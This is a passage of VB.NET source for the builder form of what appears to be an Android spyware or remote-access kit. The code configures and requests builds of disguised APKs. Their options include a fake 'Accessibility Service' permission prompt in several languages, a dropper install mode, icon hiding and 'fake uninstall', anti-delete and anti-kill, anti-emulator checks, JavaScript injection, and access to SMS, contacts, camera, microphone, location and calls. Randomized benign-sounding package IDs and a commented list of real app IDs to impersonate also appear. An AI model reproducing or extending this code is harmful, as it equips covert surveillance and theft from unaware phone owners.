                        DGVPRIMB.Rows(0).Cells(2).Value = "Remove"
                        DGVPRIMB.Rows(0).Cells(3).Value = False
                    ElseIf comboValue = "Remove" Then
                        ' Restore second row settings
                        DGVPRIMB.Rows(0).DefaultCellStyle.ForeColor = Color.White
                        DGVPRIMB.Rows(0).ReadOnly = False
                    End If
                End If
            End If

            ' Update Cell 4 based on Cell 2 and Cell 3 values
            If comboValue = "Add" AndAlso isRequest Then
                row.Cells(4).Value = deficon_ok
                row.Cells(3).ReadOnly = False
            ElseIf comboValue = "Add" AndAlso Not isRequest Then
                row.Cells(4).Value = deficon_ok_one
                row.Cells(3).ReadOnly = False
            ElseIf comboValue = "Remove" Then
                row.Cells(4).Value = deficon
                row.Cells(3).Value = False
                row.Cells(3).ReadOnly = True

            End If
        Catch ex As Exception
            Log_e("DGVPRIMSValueChanged", EXtoString(ex))
        End Try
        AddHandler DGVPRIMB.CellValueChanged, AddressOf DGVPRIMS_CellValueChanged
    End Sub

    Private Sub DGVPRIMS_CurrentCellDirtyStateChanged(sender As Object, e As EventArgs) Handles DGVPRIMB.CurrentCellDirtyStateChanged
        ' Commit the change for ComboBox edits
        If TypeOf DGVPRIMB.CurrentCell Is DataGridViewComboBoxCell Then
            DGVPRIMB.CommitEdit(DataGridViewDataErrorContexts.Commit)
        End If
    End Sub

    Private Sub ClearAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearAllToolStripMenuItem.Click
        If listicons.SelectedItems.Count > 0 Then
            ' Get the selected ListViewItem
            Dim selectedItem As ListViewItem = listicons.SelectedItems(0)

            ' Retrieve the icon name from the item's Tag property
            Dim fullpath As String = selectedItem.Tag.ToString()
            Dim iconame As String = fullpath.Substring(fullpath.LastIndexOf("/") + 1)

            Console.WriteLine("Selected Icon: " & iconame)
            Dim addResponse = useraccount.RemoveIcon(httpClient, iconame)



            Try
                Dim jsonResponse = Newtonsoft.Json.JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(addResponse)
                If jsonResponse.ContainsKey("Success") Then

                    BTAlerter.Success("Icon Removed successfully!")
                    listicons.Items.Remove(selectedItem)
                    If imagelisticons.Images.ContainsKey(fullpath) Then
                        imagelisticons.Images.RemoveByKey(fullpath)
                    End If
                ElseIf jsonResponse.ContainsKey("Fail") Then

                    Dim errorMessage = jsonResponse("Fail").Trim("""")
                    BTAlerter.erroes($"Failed to add icon: {errorMessage}")

                Else

                    BTAlerter.erroes("Unexpected server response.")
                End If

            Catch ex As Exception

            End Try
        Else
            ' Clear the big image if no item is selected
            appicoimg.Image = Nothing
            appicoimg.Tag = Nothing
        End If
    End Sub



    Private Sub Control_MouseHover(sender As Object, e As EventArgs)
        Dim control = TryCast(sender, Control)
        If control IsNot Nothing AndAlso tips.ContainsKey(control) Then
            tiptext.Text = tips(control) ' Show the tip
        End If
    End Sub

    Private Sub Control_MouseLeave(sender As Object, e As EventArgs)
        tiptext.Text = "" ' Clear the tip
    End Sub

    Private Sub langtext_SelectedIndexChanged(sender As Object, e As EventArgs) Handles langtext.SelectedIndexChanged
        Select Case langtext.Text
            Case "English"
                Acctitletext.Text = "Accessibility Service"
                Accmsgtext.Text = "This app requires access permission to work. Please allow to continue."
                Accbtntext.Text = "Enable"
                Exit Select
            Case "العربية"
                Acctitletext.Text = "صلاحية الوصول"
                Accmsgtext.Text = "يتطلب هذا التطبيق صلاحية الوصول ليعمل بشكل صحيح, اضغط تفعيل للمتابعة"
                Accbtntext.Text = "تفعيل"
                Exit Select
            Case "中国人"
                Acctitletext.Text = "无障碍服务"
                Accmsgtext.Text = "此应用需要访问权限才能运行，请允许以继续。"
                Accbtntext.Text = "启用"
                Exit Select
            Case "Русский"
                Acctitletext.Text = "Служба доступности"
                Accmsgtext.Text = "Для работы приложения требуется разрешение на доступ. Пожалуйста, разрешите продолжить."
                Accbtntext.Text = "Включить"
                Exit Select
            Case "Türkçe"
                Acctitletext.Text = "Erişilebilirlik Hizmeti"
                Accmsgtext.Text = "Bu uygulamanın çalışması için erişim izni gereklidir. Devam etmek için lütfen izin verin."
                Accbtntext.Text = "Etkinleştir"
                Exit Select
            Case "Español" ' Spanish
                Acctitletext.Text = "Servicio de accesibilidad"
                Accmsgtext.Text = "Esta aplicación requiere permiso de acceso para funcionar. Por favor, permita continuar."
                Accbtntext.Text = "Habilitar"
                Exit Select
            Case "Português" ' Portuguese (Brazilian)
                Acctitletext.Text = "Serviço de Acessibilidade"
                Accmsgtext.Text = "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar."
                Accbtntext.Text = "Habilitar"
                Exit Select
            Case Else
                Acctitletext.Text = "Accessibility Service"
                Accmsgtext.Text = "This app requires access permission to work. Please allow to continue."
                Accbtntext.Text = "Enable"
        End Select



    End Sub

    Private Sub addnum_Click(sender As Object, e As EventArgs) Handles addnum.Click
        Dim thename As String = namemonitor.Text.Trim() ' Tracking name
        Dim thelink As String = linkmonitor.Text.Trim() ' URL
        Dim theid As String = idmonitor.Text.Trim()   ' id

        ' Validation for Tracking Name
        If String.IsNullOrEmpty(thename) Then
            BTAlerter.infos("Add tracking name first.")
            namemonitor.Focus()
            Return
        End If

        ' Validation for URL and Link
        If (String.IsNullOrEmpty(thelink) AndAlso String.IsNullOrEmpty(theid)) Then
            BTAlerter.infos("You need to add at least one of these two options.")
            linkmonitor.Focus()
            idmonitor.Focus()
            Return
        End If

        Dim encodedData As String = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes($"{thename}[<s>]{thelink}[<s>]{theid}"))

        ' Check for duplicates before adding
        If traklist.Items.Cast(Of ListItem)().Any(Function(item) item.DisplayText = thename) Then

            BTAlerter.infos("This record is already added.")
            Return
        End If

        ' Add the item to the monitoring list
        Dim newItem As New ListItem(thename, encodedData)
        traklist.Items.Add(newItem)

        ' Clear inputs
        namemonitor.Text = ""
        linkmonitor.Text = ""
        idmonitor.Text = ""


    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click

        If traklist.Items.Count > 0 Then

            If traklist.SelectedItem IsNot Nothing Then

                traklist.Items.Remove(traklist.SelectedItem)
            Else
                BTAlerter.infos("Select a record first.")
            End If
        Else


            BTAlerter.infos("No records found.")

        End If
    End Sub

    'appicon, app_name, app_id, app_date, app_size, app_version, build_state
    Private Sub DGVSTORBLD_SelectionChanged(sender As Object, e As EventArgs) Handles DGVSTORBLD.SelectionChanged
        If checkstore.Active Then
            If DGVSTORBLD.Rows.Count > 0 Then
                If DGVSTORBLD.SelectedRows.Count > 0 Then
                    Dim selectedro As DataGridViewRow = DGVSTORBLD.SelectedRows(0)
                    appicoimg.Image = selectedro.Cells(0).Value
                    appicoimg.Tag = "STORE"
                    listicons.Enabled = False
                    listicons.Visible = False
                    appname.Text = selectedro.Cells(1).Value
                    Panelname.Enabled = False
                    appids.Text = selectedro.Cells(2).Value
                    panelids.Enabled = False
                    appver.Text = selectedro.Cells(5).Value
                    Panelver.Enabled = False
                End If
            End If

        Else

            Panelver.Enabled = True
            appver.Enabled = True
            panelids.Enabled = True
            Panelname.Enabled = True
            appids.Enabled = True
            appicoimg.Image = Nothing
            appicoimg.Tag = Nothing
            listicons.Enabled = True
            listicons.Visible = True
        End If
    End Sub

    Private Async Sub builderworker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles builderworker.DoWork
        startbuilder()
    End Sub
    Private Sub startbuilder()
        Try
            Dim theappname As String = appname.Text
            Dim theppver As String = appver.Text.Replace("V", "")
            Dim theappurl As String = applink.Text
            Dim theconkey As String = connectionkey.Text


            If ListTags.Items.Count = 0 Then
                Me.Invoke(Sub()
                              BTAlerter.infos(emptytagstr)
                          End Sub)
                Return
            End If

            Dim clienttag As String = LastSelectedTag
            If isEmpty(clienttag) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(clitagreqstr)
                          End Sub)
                Return
            End If


            If isEmpty(theconkey) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(conkeywrngstr)
                          End Sub)
                Return
            End If

            If isEmpty(theappurl) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(apurlfstr)
                          End Sub)
                Return
            End If

            Dim clientname As String = CLiname.Text


            If isEmpty(clientname) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(clinamfstr)
                          End Sub)
                Return
            End If




            ' Dim hostname As String = BTConst.mainsite + "<"
            Dim hostname As String = ""

            For Each ho As String In listhosts.Items
                hostname += ho + "<"
            Next

            'BTConst.mainsite
            If isEmpty(hostname) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(clihstfstr)
                          End Sub)
                Return
            End If



            Dim appid As String = appids.Text

            If isEmpty(appid) Then
                Me.Invoke(Sub()
                              BTAlerter.infos(apidfstr)
                          End Sub)
                Return
            End If

            Dim notytitle As String = titletext.Text

            If isEmpty(notytitle) Then
                notytitle = "<E>"
            End If


            Dim notymsg As String = msgtext.Text

            If isEmpty(notymsg) Then
                notymsg = "<E>"
            End If

            Dim isnosleep As String = If(checknosleep.Checked, "1", "0")


            ' Define SPLITTER
            Dim SPLITTER As String = "[*]"

            ' Access Permission
            Dim addAccess As Boolean = If(DGVPRIMB.Rows(0).Cells(2).Value = "Add", True, False)
            Dim requestAccess As Boolean = addAccess AndAlso DGVPRIMB.Rows(0).Cells(3).Value = True
            Dim use_access As String = If(addAccess, If(requestAccess, "1|1", "1|0"), "0|0")

            ' Draw Over Apps
            Dim addDrawOverApps As Boolean = If(DGVPRIMB.Rows(2).Cells(2).Value = "Add", True, False)
            Dim requestDrawOverApps As Boolean = addDrawOverApps AndAlso DGVPRIMB.Rows(2).Cells(3).Value = True
            Dim use_draw As String = If(addDrawOverApps, If(requestDrawOverApps, "1|1", "1|0"), "0|0")

            ' Background Data Usage
            Dim addBackgroundDataUsage As Boolean = If(DGVPRIMB.Rows(5).Cells(2).Value = "Add", True, False)
            Dim requestBackgroundDataUsage As Boolean = addBackgroundDataUsage AndAlso DGVPRIMB.Rows(5).Cells(3).Value = True
            Dim use_backusage As String = If(addBackgroundDataUsage, If(requestBackgroundDataUsage, "1|1", "1|0"), "0|0")

            ' Usage Access
            Dim addUsageAccess As Boolean = If(DGVPRIMB.Rows(1).Cells(2).Value = "Add", True, False)
            Dim requestUsageAccess As Boolean = addUsageAccess AndAlso DGVPRIMB.Rows(1).Cells(3).Value = True
            Dim use_usage As String = If(addUsageAccess, If(requestUsageAccess, "1|1", "1|0"), "0|0")

            ' Change Phone Settings
            Dim addChangePhoneSettings As Boolean = If(DGVPRIMB.Rows(3).Cells(2).Value = "Add", True, False)
            Dim requestChangePhoneSettings As Boolean = addChangePhoneSettings AndAlso DGVPRIMB.Rows(3).Cells(3).Value = True
            Dim use_phone As String = If(addChangePhoneSettings, If(requestChangePhoneSettings, "1|1", "1|0"), "0|0")

            ' Battery Optimization
            Dim addBatteryOptimization As Boolean = If(DGVPRIMB.Rows(4).Cells(2).Value = "Add", True, False)
            Dim requestBatteryOptimization As Boolean = addBatteryOptimization AndAlso DGVPRIMB.Rows(4).Cells(3).Value = True
            Dim use_battery_optimization As String = If(addBatteryOptimization, If(requestBatteryOptimization, "1|1", "1|0"), "0|0")

            ' Files Access
            Dim addFilesAccess As Boolean = If(DGVPRIMB.Rows(6).Cells(2).Value = "Add", True, False)
            Dim requestFilesAccess As Boolean = addFilesAccess AndAlso DGVPRIMB.Rows(6).Cells(3).Value = True
            Dim use_files As String = If(addFilesAccess, If(requestFilesAccess, "1|1", "1|0"), "0|0")

            ' Camera Access
            Dim addCameraAccess As Boolean = If(DGVPRIMB.Rows(7).Cells(2).Value = "Add", True, False)
            Dim requestCameraAccess As Boolean = addCameraAccess AndAlso DGVPRIMB.Rows(7).Cells(3).Value = True
            Dim use_camera As String = If(addCameraAccess, If(requestCameraAccess, "1|1", "1|0"), "0|0")

            ' Microphone Access
            Dim addMicrophoneAccess As Boolean = If(DGVPRIMB.Rows(8).Cells(2).Value = "Add", True, False)
            Dim requestMicrophoneAccess As Boolean = addMicrophoneAccess AndAlso DGVPRIMB.Rows(8).Cells(3).Value = True
            Dim use_microphone As String = If(addMicrophoneAccess, If(requestMicrophoneAccess, "1|1", "1|0"), "0|0")

            ' Read SMS
            Dim addReadSMS As Boolean = If(DGVPRIMB.Rows(9).Cells(2).Value = "Add", True, False)
            Dim requestReadSMS As Boolean = addReadSMS AndAlso DGVPRIMB.Rows(9).Cells(3).Value = True
            Dim use_sms_read As String = If(addReadSMS, If(requestReadSMS, "1|1", "1|0"), "0|0")

            ' Send SMS
            Dim addSendSMS As Boolean = If(DGVPRIMB.Rows(10).Cells(2).Value = "Add", True, False)
            Dim requestSendSMS As Boolean = addSendSMS AndAlso DGVPRIMB.Rows(10).Cells(3).Value = True
            Dim use_sms_send As String = If(addSendSMS, If(requestSendSMS, "1|1", "1|0"), "0|0")

            ' Read Contacts
            Dim addReadContacts As Boolean = If(DGVPRIMB.Rows(11).Cells(2).Value = "Add", True, False)
            Dim requestReadContacts As Boolean = addReadContacts AndAlso DGVPRIMB.Rows(11).Cells(3).Value = True
            Dim use_contacts As String = If(addReadContacts, If(requestReadContacts, "1|1", "1|0"), "0|0")

            ' Read Accounts
            Dim addReadAccounts As Boolean = If(DGVPRIMB.Rows(12).Cells(2).Value = "Add", True, False)
            Dim requestReadAccounts As Boolean = addReadAccounts AndAlso DGVPRIMB.Rows(12).Cells(3).Value = True
            Dim use_accounts As String = If(addReadAccounts, If(requestReadAccounts, "1|1", "1|0"), "0|0")

            ' Show Notifications
            Dim addNotifications As Boolean = If(DGVPRIMB.Rows(13).Cells(2).Value = "Add", True, False)
            Dim requestNotifications As Boolean = addNotifications AndAlso DGVPRIMB.Rows(13).Cells(3).Value = True
            Dim use_notifications As String = If(addNotifications, If(requestNotifications, "1|1", "1|0"), "0|0")

            '  location
            Dim addlocations As Boolean = If(DGVPRIMB.Rows(14).Cells(2).Value = "Add", True, False)
            Dim requestlocation As Boolean = addlocations AndAlso DGVPRIMB.Rows(14).Cells(3).Value = True
            Dim use_locationss As String = If(addlocations, If(requestlocation, "1|1", "1|0"), "0|0")


            Dim addcallphone As Boolean = If(DGVPRIMB.Rows(15).Cells(2).Value = "Add", True, False)
            Dim requestcallphone As Boolean = addcallphone AndAlso DGVPRIMB.Rows(15).Cells(3).Value = True
            Dim use_callphone As String = If(addcallphone, If(requestcallphone, "1|1", "1|0"), "0|0")


            'checkhidprim
            Dim hide_primes As String = If(checkhidprim.Checked, "1|1", "0|0")

            'disable google play
            Dim disableStore As String = If(checkdisstore.Checked, "1|1", "0|0")

            '----------
            'for builder not apk

            Dim protectit As String = If(checkprotect.Checked, "1|1", "0|0")
            Dim pumpit As String = If(checkpump.Checked, "1|1", "0|0")


            '----------

            ' Combine all values into one string
            Dim configstr As String = String.Join(SPLITTER, {
                 use_access,
                 use_draw,
                 use_backusage,
                 use_usage,
                 use_phone,
                 use_battery_optimization,
                 use_files,
                 use_camera,
                 use_microphone,
                 use_sms_read,
                 use_sms_send,
                 use_contacts,
                 use_accounts,
                 use_notifications,
                 hide_primes,
                 disableStore,
                 use_locationss,
                 protectit,
                 pumpit,
                 use_callphone
            })





            ' Dim isautostart As String = If(checkautostart.Active, "1", "0")


            Dim isnoemulator As String = If(checknoemu.Checked, "1", "0")


            'Dim isallprims As String = If(checkallprims.Active, "1", "0")

            'Dim selectedIndex As Integer = langtext.SelectedIndex
            Dim targetlanguage As String = ""

            'If selectedIndex <> -1 Then
            '    Select Case selectedIndex
            '        Case 0
            '            targetlanguage = "en"
            '        Case 1
            '            targetlanguage = "ar"
            '        Case 2
            '            targetlanguage = "zh"
            '        Case 3
            '            targetlanguage = "ru"
            '        Case 4
            '            targetlanguage = "tr"
            '        Case Else
            '            targetlanguage = ""
            '    End Select
            'End If

            Select Case langtext.Text
                Case "English"
                    targetlanguage = "en"
                Case "العربية"
                    targetlanguage = "ar"
                Case "中国人"
                    targetlanguage = "zh"
                Case "Русский"
                    targetlanguage = "ru"
                Case "Türkçe"
                    targetlanguage = "tr"
                Case "Español"
                    targetlanguage = "es"
                Case "Português"
                    targetlanguage = "pt"
                Case Else
                    targetlanguage = ""
            End Select


            Dim installtype As String = "g"
            Dim isnodelete As String = "0"
            Dim iscapscreen As String = "0"
            Dim isautoallow As String = "0"
            Dim isautorunback As String = "0"


            Dim login_title As String = Acctitletext.Text

            Dim login_dec As String = Accmsgtext.Text
            Dim login_btn As String = Accbtntext.Text


            Dim hideids As String = ""

            If addAccess Then
                If isEmpty(targetlanguage) Then
                    Me.Invoke(Sub()
                                  BTAlerter.infos(aplungfstr)
                              End Sub)
                    Return
                End If
                '1 Guid
                '2 Drooper
                installtype = If(comboacctype.Text.StartsWith("2"), "d", "g")
                isnodelete = If(checkantidelete.Checked, "1", "0")
                iscapscreen = If(checkcaplock.Checked, "1", "0")
                isautoallow = If(checkautoprims.Checked, "1", "0")

                If isEmpty(login_title) Or isEmpty(login_btn) Or isEmpty(login_dec) Then
                    Me.Invoke(Sub()
                                  BTAlerter.infos(filpag4str)
                              End Sub)
                    Return
                End If

                If Listhides.Items.Count > 0 Then
                    For Each idapp As String In Listhides.Items
                        hideids += idapp + ","
                    Next
                End If

            Else
                hideids = "null"
                targetlanguage = "en"
                login_title = "Accessibility Service"
                login_btn = "This app requires access permission to work. Please allow to continue."
                login_dec = "Enable"
            End If




            'combohideico
            '            Disabled
            '            Fake uninstall
            'Complete Hide
            Dim usehidden As String = "0"
            Dim hidetype As String = "null"
            'If combohideico.Text <> "Disabled" Then
            '    usehidden = "1"
            '    If combohideico.SelectedItem = "Fake uninstall" Then
            '        hidetype = "f"
            '    ElseIf combohideico.SelectedText = "Complete Hide" Then
            '        hidetype = "c"

            '    End If
            'End If


            Select Case hideicocombox.Text.ToString()
                Case "No Hide"
                    Exit Select
                Case "Fake uninstall"
                    usehidden = "1"
                    hidetype = "f"
                    Exit Select
                Case "Complete hide"
                    usehidden = "1"
                    hidetype = "c"
                    Exit Select
            End Select

            'If checkhidico.Checked Then
            '    usehidden = "1"
            '    hidetype = "c"
            'End If


            Dim MonitorPack As String = "empty|"
            If traklist.Items.Count > 0 Then
                MonitorPack = ""
                For Each rec As ListItem In traklist.Items
                    MonitorPack += rec.EncodedData + "|"
                Next
            End If

            'buildtype
            Dim buildtype As String = "C"
            If checkstore.Active Then
                buildtype = "S"
            End If

            'checkantistop
            Dim use_antkill As String = If(checkantistop.Checked, "1", "0")

            'force permissions
            Dim forceprimes As String = If(checkforceprims.Checked, "1", "0")

            Dim jectjscode As String = ToBase64("NA")
            Dim jecttext As String = jectjstext.Text
            If checkjctjs.Checked Then
                If Not isEmpty(jecttext) Then
                    jectjscode = ToBase64(jecttext)
                End If
            End If


            jectjscode = ToBase64(
                  If(checkonejs.Checked,
                    jectjscode + "|" + "1",
                    jectjscode + "|" + "0"
                    )
                )

            If appicoimg.Tag Is Nothing Then
                Me.Invoke(Sub()
                              BTAlerter.infos(slcticostr)
                          End Sub)
                Return
            End If
            Dim iconname As String = appicoimg.Tag
            Dim Randomkey As String = RandomString(32)
            Dim params As New Dictionary(Of String, String) From {
                {"subcom", "build"},
                {"ran_key", Randomkey},
                {"chk", nextkey},
                {"btype", buildtype}, ' C = custom, S = Store
                {"uhost", hostname},
                {"cname", clientname},
                {"uaccess", use_access.Split("|")(0)},
                {"udraw", use_draw},
                {"ukill", use_antkill},
                {"fprims", forceprimes},
                {"jctjs", jectjscode},
                {"Ctag", clienttag},
                {"uprims", isautoallow},
                {"appid", appid},
                {"nottitle", notytitle},
                {"notmsg", notymsg},
                {"appname", theappname},
                {"appversion", theppver},
                {"icoid", iconname},
                {"appurl", theappurl},
                {"allprims", "0"},'reused for inject js
                {"logt", ToBase64(login_title)},
                {"logd", ToBase64(login_dec)},
                {"hideit", ToBase64(hideids)},
                {"logb", login_btn},
                {"loglng", targetlanguage},
                {"hidapp", usehidden},
                {"noemu", isnoemulator},
                {"miuistart", "1"},
                {"autoback", theconkey},'autoback reused for key
                {"accsstyp", installtype},
                {"hidtype", hidetype},
                {"slep", isnosleep},
                {"capscr", iscapscreen},
                {"trakdata", MonitorPack},
                {"allconf", configstr},
                {"udele", isnodelete}
            }
            Dim buildreq As New Thread(Async Sub()
                                           Dim result = Await CommandStore(params, httpClient)
                                           If result.Item1 Then
                                               Dim response As String = result.Item2.Replace("\", "").Trim("""")
                                               Me.Invoke(Sub()
                                                             MyMsg.Show("Success", response, msgtype.Confirm, False)
                                                             Me.Close()
                                                         End Sub)
                                           Else
                                               Me.Invoke(Sub()
                                                             BTAlerter.erroes(result.Item2)
                                                         End Sub)
                                           End If
                                           Console.WriteLine(result.Item2)
                                       End Sub)
            buildreq.IsBackground = True
            buildreq.Start()


        Catch ex As Exception
            Log_e("builderworker", EXtoString(ex))
        End Try
    End Sub
    Private numberrandomer As Random = Nothing
    Private Sub randver_Click(sender As Object, e As EventArgs) Handles randver.Click
        If numberrandomer Is Nothing Then
            numberrandomer = New Random
        End If
        appver.Text =
            numberrandomer.Next(1, 99).ToString +
            "." +
            numberrandomer.Next(1, 199).ToString +
         "." +
         numberrandomer.Next(1, 199).ToString
    End Sub

    Private Sub randids_Click(sender As Object, e As EventArgs) Handles randids.Click
        If numberrandomer Is Nothing Then
            numberrandomer = New Random
        End If
        appids.Text = randmid(numberrandomer.Next(0, randmid.Length)) +
            "." +
            randmid2(numberrandomer.Next(0, randmid2.Length)) +
            "." +
            randmid(numberrandomer.Next(0, randmid.Length))
        'appids.Text = GetRandomPackageID()
    End Sub

    'this is id's for app from google play that uses accessibility
    'in general not good idea to use same app from store 
    'Public Function GetRandomPackageID() As String
    '    If numberrandomer Is Nothing Then
    '        numberrandomer = New Random
    '    End If
    '    Dim packageList As New List(Of String) From {
    '    "com.babydola.lockscreens",
    '    "net.east_hino.accessibility_shortcut",
    '    "com.appautomatic.ankulua.lite",
    '    "com.bitculture.nopaccessibility",
    '    "com.redmanit.lockscreen",
    '    "net.met.control.center",
    '    "com.jordigordillo.dtswidget",
    '    "apps.ijp.ainput",
    '    "com.remotepc.host",
    '    "com.idrive.helpdesk.host",
    '    "com.screentime",
    '    "com.motorola.spaces",
    '    "nu.nav.float",
    '    "com.kahf.dns",
    '    "com.voicemouse",
    '    "com.mithriltower.accessibilityservicesapp",
    '    "com.homebutton.menubutton.easytouch",
    '    "flud.fludnav.fludnavbar",
    '    "mavie.shadowsong.bb",
    '    "nu.lower.brightness.pro",
    '    "com.apowersoft.mirror",
    '    "com.deque.mobile.devtools.axedevtoolsanalyzer",
    '    "com.homebutton.menubutton.easytouch",
    '    "net.east_hino.accessibility_shortcut",
    '    "com.sisomobile.android.brightness",
    '    "com.autolikeswipe",
    '    "com.force.stop.apps",
    '    "com.harasees.lockscreen",
    '    "com.gb.lock",
    '    "com.weixikeji.secretshoot.googleV2",
    '    "com.idrive.helpdesk.host",
    '    "com.remotepc.host",
    '    "com.asus.glidex",
    '    "com.gameclicker.autoclicker.pro",
    '    "com.pransuinc.backbutton",
    '    "com.autoclick.automatic.speed.clicker.tools",
    '    "com.guhyata.privacymanager.lite",
    '    "com.visioapps.louie",
    '    "com.asus.glidex",
    '    "com.shexa.permissionmanager",
    '    "com.glitch.accessibilitytester",
    '    "com.redmanit.lockscreen",
    '    "com.tyganeutronics.telcomaster",
    '    "net.eztool.backbutton",
    '    "nu.back.button",
    '    "com.autoclicker.quicktouch.tapping",
    '    "com.sisomobile.android.brightness",
    '    "com.motorola.tag",
    '    "com.automatictap.autoclicker.clickerspeed",
    '    "com.motorola.detachedhandler"
    '    }

    '    ' Remove duplicates, if needed
    '    Dim uniquePackages = packageList.Distinct().ToList()


    '    Dim index As Integer = numberrandomer.Next(0, uniquePackages.Count)

    '    Return uniquePackages(index)
    'End Function

    Private randmid As String() = New String() {
    "helper", "musics", "scanner", "sensor", "service",
    "listener", "logger", "manager", "tracker", "analyzer",
    "responder", "provider", "monitor", "tasker", "fetcher",
    "updater", "notifier", "config", "broadcaster", "engine",
    "dispatcher", "initializer", "watcher", "controller", "compiler",
    "injector", "agent", "module", "executor", "decoder",
    "encoder", "handler", "daemon", "interceptor", "guardian",
    "synchronizer", "router", "channel", "resolver", "transmitter",
    "scheduler", "recycler", "observer", "validator", "repeater",
    "registrar", "extractor", "conductor", "pinger", "poller",
    "allocator", "activator", "stabilizer", "linker", "queue",
    "filter", "migrator", "merger", "parser", "sequencer",
    "assembler", "generator", "transformer", "collector", "dispatcher",
    "aggregator", "notifier", "orchestrator", "translator", "integrator",
    "loader", "watchdog", "connector", "dispatcher", "formatter",
    "iterator", "duplicator", "normalizer", "optimizer", "randomizer",
    "simulator", "converter", "combiner", "validator", "authorizer",
    "renderer", "adapter", "modulator", "transcoder", "stager",
    "expander", "compressor", "balancer", "packager", "cataloger",
    "archiver", "shuffler", "verifier", "emulator", "enforcer",
    "propagator", "distributor", "calculator", "processor", "indexer",
    "explorer", "messenger", "subsystem", "proxy", "upscaler"
    }
    Private randmid2 As String() = New String() {
    "relay", "schedulerx", "streamer", "notary", "signaler",
    "cipher", "replicator", "guardianx", "mapper", "allocatorx",
    "prober", "attester", "invoker", "fuser", "demuxer",
    "muxer", "packagerx", "regulator", "quantizer", "harmonizer",
    "balancerx", "watchtower", "streamguard", "verdictor", "anonymizer",
    "redactor", "scrubber", "classifier", "detector", "resolverx",
    "filterer", "diffuser", "normalizerx", "inspector", "predictor",
    "auditor", "overseer", "pilot", "navigator", "relayx",
    "guardianbot", "provisioner", "weaver", "synthesizer", "orchestrax",
    "patcher", "gatekeeper", "warden", "marshall", "triager",
    "coordinator", "activatorx", "enabler", "terminator", "curator",
    "indexbot", "facilitator", "metronome", "harmonizerx", "refiner",
    "enumerator", "sampler", "planner", "resonator", "correlator",
    "analyzerx", "schedulerbot", "validatorx", "stabilizerx", "injectorx",
    "differentiator", "aggregatorx", "modeller", "predictorx", "verifierx",
    "watchdogx", "transactor", "emitter", "pipeliner", "calibrator",
    "aggregabot", "translatorx", "transcriber", "disassembler", "interpreter",
    "routerx", "combinerx", "expeditor", "shielder", "collator",
    "indexguard", "projector", "dispatcherx", "resourcer", "guardianbotx",
    "refactor", "transposer", "broker", "allocatorbot", "loadbalancer"
    }



    Private Package_keyback As Boolean
    Private Sub appids_TextChanged(sender As Object, e As EventArgs) Handles appids.TextChanged
        Dim scan As String = appids.Text.Trim

        If Package_keyback Then

            If Not scan.Contains(".") Then

                Dim cn As Integer = appids.SelectionStart

                scan = scan.Insert(cn, ".")

                appids.Text = scan

                Try
                    appids.SelectionStart = scan.IndexOf(".")
                Catch x_skipErrors As Exception
                End Try

            End If

        End If


        Try
            If IsNumeric(scan.Chars(0).ToString) Then
                appids.Text = scan.Substring(1, scan.Length - 1)
            End If
        Catch x_skipErrors As Exception

        End Try

        Try

            If IsNumeric(scan.Chars(scan.IndexOf(".") + 1).ToString) Then
                appids.Text = appids.Text.Replace("." & scan.Chars(scan.IndexOf(".") + 1).ToString, ".")
                appids.SelectionStart = scan.IndexOf(".")
            End If
        Catch x_skipErrors As Exception

        End Try

    End Sub

    Private Sub appids_KeyDown(sender As Object, e As KeyEventArgs) Handles appids.KeyDown
        If e.KeyCode = Keys.Back Then

            Package_keyback = True

        Else

            Package_keyback = False

        End If
    End Sub

    Private Sub appids_KeyPress(sender As Object, e As KeyPressEventArgs) Handles appids.KeyPress
        If Not appids.SelectionLength = 0 Then

            If appids.SelectedText.Contains(".") Then

                appids.DeselectAll()

                e.Handled = True

                Return

            End If

        End If

        Dim scan As String = appids.Text.Trim

        Dim sKeys As String = "qazwsxedcrfvtgbyhnujmikolp"

        Dim sKeysAll As String = "1234567890qazwsxedcrfvtgbyhnujmikolp"

        If scan.EndsWith(".") Then
            If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

                Return

            End If
        Else
            If Not sKeysAll.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click
        If Not String.IsNullOrEmpty(inputhost.Text) Then
            If Not listhosts.Items.Contains(inputhost.Text) Then
                listhosts.Items.Add(inputhost.Text)
                'Dim holdername As String = inputhost.Text
                'If String.IsNullOrEmpty(holdername) Or String.IsNullOrWhiteSpace(holdername) Or holdername = "spysolr.com" Or holdername = "spysolr.site" Then
                '    holdername = "..."
                'End If

            End If
        End If
    End Sub

    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon3.Click
        If listhosts.Items.Count > 0 Then
            If listhosts.SelectedItem IsNot Nothing Then
                If listhosts.SelectedItem = BTConst.mainsite Then
                    BTAlerter.infos("Can't remove main site.")
                    Return
                End If
                listhosts.Items.Remove(listhosts.SelectedItem)

            End If

        End If
    End Sub

    Private Sub DrakeUICheckBox1_ValueChanged(sender As Object, value As Boolean) Handles DrakeUICheckBox1.ValueChanged

        Dim statetext As String = ""
        If value Then
            statetext = "Add"
        Else
            statetext = "Remove"
        End If
        For Each row As DataGridViewRow In DGVPRIMB.Rows
            If row.Cells(0).Value?.ToString() <> "2" AndAlso row.Cells(0).Value?.ToString() <> "4" AndAlso row.Cells(0).Value?.ToString() <> "6" Then
                ' row.Cells(1).Value = comboVal
                row.Cells(2).Value = statetext
                row.Cells(3).Value = value


                Exit For
            End If
        Next
    End Sub

    Private Sub DrakeUICheckBox2_ValueChanged(sender As Object, value As Boolean) Handles checkjctjs.ValueChanged
        If value Then

            checkonejs.Enabled = True
            checkonejs.Enabled = True
            checkonejs.Visible = True
            jectjstext.Text = ""
            jectjstext.ReadOnly = False
        Else
